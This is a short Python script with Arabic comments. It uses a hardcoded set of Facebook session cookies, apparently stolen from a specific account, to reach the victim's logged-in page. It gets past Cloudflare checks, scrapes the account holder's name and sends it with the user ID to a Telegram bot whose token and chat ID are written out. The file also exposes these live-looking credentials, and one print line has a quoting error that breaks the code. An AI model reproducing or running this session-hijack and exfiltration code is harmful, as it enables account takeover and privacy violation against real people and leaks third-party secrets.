import cloudscraper
import requests
import re

token = "7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks"
chat_id = "5042495708"

fb_cookies = {
    'sb': 'iWplaTgxXWaKpJpcZOMr2nJZ',
    'datr': 'iGplaV28PgweKRFA2B3ALpcC',
    'c_user': '100003550913323',
    'xs': '31%3AyHNizqiAxU5oow%3A2%3A1768254323%3A-1%3A-1',
    'fr': '0ZAmSGvgnip1quTXs.AWfw6uk4qDzCGUgea1BNvM1DCSzgRUHTEpWlcLo58iBFHgXciew.BpZWqJ..AAA.0.0.BpatE5.AWcjcdKnazYzQbCYdrm_tr12cos'
}

def get_fb_name():
    print("🕵️ جاري محاولة صيد الاسم...")
    scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'desktop': False})
    
    try:
        # نجرب ندخل لـ mbasic
        res = scraper.get("https://mbasic.facebook.com/me", cookies=fb_cookies)
        
        # إذا الحساب مفتوح، نسحب الاسم من العنوان
        if "تسجيل الخروج" in res.text or "Logout" in res.text or "100003550913323" in res.text:
            name_match = re.search(r'<title>(.*?)</title>', res.text)
            name = name_match.group(1) if name_match else "فادي (الحساب نشط)"
            
            # تنظيف الاسم لو فيه كلمة Facebook
            name = name.replace(" | Facebook", "").replace("Facebook", "")
            
            print(f"✅ تم صيد الاسم: {name}")
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage", 
                         params={"chat_id": chat_id, "text": f"👤 الاسم في فيسبوك: {name}\n🆔 الآيدي: 100003550913323\n🔥 الموتور شغال مسمار ذلحين!"})
        else:
            print("❌ فيسبوك طلب تسجيل دخول. الكوكيز شكلها "هبكت"!")
            
    except Exception as e:
        print(f"🚫 وقع خطأ: {e}")

if __name__ == "__main__":
    get_fb_name()
